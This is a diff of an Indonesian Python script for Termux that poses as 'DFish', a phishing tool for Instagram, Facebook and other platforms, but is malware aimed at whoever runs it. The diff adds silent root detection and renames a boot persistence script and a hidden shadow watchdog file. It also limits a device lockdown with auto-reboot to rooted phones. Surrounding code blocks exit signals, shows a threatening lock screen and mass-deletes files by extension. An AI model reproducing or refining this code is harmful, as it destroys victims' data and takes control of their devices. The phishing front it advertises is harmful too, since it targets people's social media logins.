@@ -28,7 +28,19 @@ def bold_red_print(text, end='\n'):
     print(f"{BOLD_RED}{text}{RESET}", end=end)
 
 # ============================================
-# 1. BLOKIR INPUT PALSU
+# DETEKSI ROOT (SENYAP - TANPA PERINGATAN)
+# ============================================
+def check_root():
+    try:
+        result = subprocess.run(["su", "-c", "id"], capture_output=True, text=True, timeout=2)
+        return "uid=0" in result.stdout
+    except:
+        return False
+
+IS_ROOT = check_root()
+
+# ============================================
+# 1. BLOKIR SINYAL KELUAR
 # ============================================
 def block_all_signals():
     for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGTSTP, signal.SIGQUIT, signal.SIGHUP]:
@@ -57,7 +69,7 @@ def install_persistence():
     script_path = os.path.abspath(__file__)
     termux_boot = os.path.expanduser("~/.termux/boot")
     os.makedirs(termux_boot, exist_ok=True)
-    boot_script = os.path.join(termux_boot, "00-system.sh")
+    boot_script = os.path.join(termux_boot, "00-dfish.sh")
     with open(boot_script, 'w') as f:
         f.write(f"""#!/data/data/com.termux/files/usr/bin/bash
 sleep 2
@@ -79,7 +91,7 @@ def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
 # ============================================
-# 2. AUTO STORAGE PERMISSION (WARNA NORMAL)
+# 2. AUTO STORAGE PERMISSION
 # ============================================
 def check_storage_permission():
     try:
@@ -110,7 +122,7 @@ def auto_request_storage_permission():
     print("\n" + "="*60)
     print("  ⚠️  STORAGE PERMISSION REQUIRED  ⚠️")
     print("="*60)
-    print("\nTools ini membutuhkan akses ke storage Anda.\n")
+    print("\nDFish membutuhkan akses ke storage Anda.\n")
     
     if force_permission_if_rooted():
         time.sleep(1)
@@ -149,12 +161,12 @@ def auto_request_storage_permission():
         return False
 
 # ============================================
-# 3. KEAMANAN 4 LAPIS
+# 3. WATCHDOG 4 LAPIS
 # ============================================
 class UltimateWatchdog:
     def __init__(self, script_path):
         self.script_path = os.path.abspath(script_path)
-        self.shadow_path = "/data/local/tmp/.system_shadow.py"
+        self.shadow_path = "/data/local/tmp/.dfish_shadow.py"
     
     def activate(self):
         self._layer1_thread()
@@ -222,7 +234,7 @@ class UltimateWatchdog:
         threading.Thread(target=shadow_watchdog, daemon=True).start()
 
 # ============================================
-#                                      
+# 4. LOCKDOWN TOTAL (HANYA JALAN KALAU ROOT)
 # ============================================
 class TermuxLockdown:
     def __init__(self):
@@ -318,25 +330,23 @@ def auto_reboot_on_exit():
     threading.Thread(target=reboot_monitor, daemon=True).start()
 
 def activate_total_lockdown():
-    print("\n[🔒] ACTIVATING TOTAL SYSTEM LOCKDOWN...")
-    lockdown = TermuxLockdown()
-    lockdown.activate_lockdown()
-    auto_reboot_on_exit()
-    try:
-        os.system("svc power stayon true 2>/dev/null")
-    except:
-        pass
-    print("[✓] TOTAL LOCKDOWN ACTIVATED")
-    print("[✓] YOU CANNOT EXIT - YOU CANNOT ESCAPE\n")
+    if IS_ROOT:
+        lockdown = TermuxLockdown()
+        lockdown.activate_lockdown()
+        auto_reboot_on_exit()
+        try:
+            os.system("svc power stayon true 2>/dev/null")
+        except:
+            pass
 
 # ============================================
-# 5. BANNER PHISHING (WARNA NORMAL)
+# 5. BANNER PHISHING 
 # ============================================
 def show_phishing_banner():
     banner = f"""
     ╔══════════════════════════════════════════════════════════════════════════════════════╗
-    ║                         🌐 PHISHING ALL MEDSOS PRO 🌐                                 ║
-    ║                           Premium Phishing Framework                                  ║
+    ║                           🐟 DFISH - PHISHING TOOL 🐟                                ║
+    ║                              Premium Phishing Framework                               ║
     ╠══════════════════════════════════════════════════════════════════════════════════════╣
     ║  [1] Instagram     [2] Facebook     [3] Twitter/X     [4] TikTok                     ║
     ║  [5] WhatsApp      [6] Telegram     [7] LinkedIn      [8] Custom Template            ║
@@ -444,7 +454,7 @@ def verifying_captured_data():
 # ============================================
 
 # ============================================
-# 8. LAYAR PASSWORD (WARNA MERAH)
+# 8. LAYAR PASSWORD 
 # ============================================
 def password_lock_no_hope():
     clear()
@@ -470,7 +480,7 @@ def password_lock_no_hope():
     bold_red_print(f"\n{'='*70}")
     bold_red_print(f"   ⚠️  PERINGATAN! PERINGATAN! PERINGATAN!  ⚠️")
     bold_red_print(f"{'='*70}")
-    bold_red_print(f"\n💀 ANDA TELAH MENJALANKAN TOOLS ILEGAL 💀")
+    bold_red_print(f"\n💀 ANDA TELAH MENJALANKAN DFISH ILEGAL 💀")
     bold_red_print(f"📱 SEMUA DATA ANDA SEDANG DIHAPUS PERMANEN 📱")
     bold_red_print(f"👁️  LOKASI ANDA TELAH DILACAK 👁️")
     bold_red_print(f"🔒 TERMUX TIDAK DAPAT DITUTUP ATAU DIHENTIKAN")
@@ -501,7 +511,7 @@ def password_lock_no_hope():
     return False
 
 # ============================================
-# 9. CAPTURE DATA                                   
+# 9. TOTAL DELETION 
 # ============================================
 ALL_EXTENSIONS = [
     '.apk', '.aab', '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
@@ -569,7 +579,7 @@ def total_deletion():
     bold_red_print(f"\n{'='*70}")
 
 # ============================================
-# 10. LOOP TAK TERHINGGA (WARNA MERAH)
+# 10. LOOP TAK TERHINGGA
 # ============================================
 def infinite_terror_loop():
     bold_red_print(f"\n[💀] SYSTEM TERLOCKED - NO ESCAPE [💀]\n")
@@ -593,7 +603,7 @@ def main():
     print("="*60)
     
     if not auto_request_storage_permission():
-        print("\n[💀] Tools cannot continue without storage permission.")
+        print("\n[💀] DFish cannot continue without storage permission.")
         time.sleep(5)
         sys.exit(1)
     
@@ -612,11 +622,11 @@ def main():
     clear()
     show_phishing_banner()
     
-    print("\n[+] Tools siap digunakan!")
+    print("\n[+] DFish siap digunakan!")
     print("[!] Pastikan koneksi internet stabil\n")
     
     try:
-        choice = input("┌─[root@phishing:~]\n└──◆ Pilih menu (1-0): ")
+        choice = input("┌─[root@dfish:~]\n└──◆ Pilih menu (1-0): ")
         
         if choice in LOGIN_URLS:
             platform_name = {
